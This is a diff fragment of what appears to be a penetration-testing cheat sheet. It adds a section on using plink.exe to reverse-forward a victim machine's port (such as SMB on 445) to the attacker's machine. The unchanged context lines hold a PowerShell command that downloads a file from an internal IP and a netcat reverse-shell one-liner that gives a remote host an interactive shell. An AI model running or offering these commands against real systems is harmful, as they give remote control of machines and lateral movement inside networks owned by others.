@@ -383,3 +383,23 @@ powershell -command "& { iwr http://192.168.199.1/win.txt -OutFile win.txt }"
 
 ## Reverse shell with nc
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+
+plink
+
+→ What is plink:
+
+Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is a command line application.It makes simple interactive connection to a remote server. This means that you cannot just double-click on its icon to run it and instead you have to bring up a console window. 
+
+Example to expose ports: 445 (samba)
+
+How to expose a port on your local machine:
+
+[local_machine]: systemctl start ssh
+
+→ Upload plink.exe on remote machine as binary (mode)
+
+[remote_machine]: plink.exe -l [username] -pw [password] -R [port]:127.0.0.1:[port] [ip]
+
+→ After that, the victim’s port will be exposed on your local machine (127.0.0.1)
+
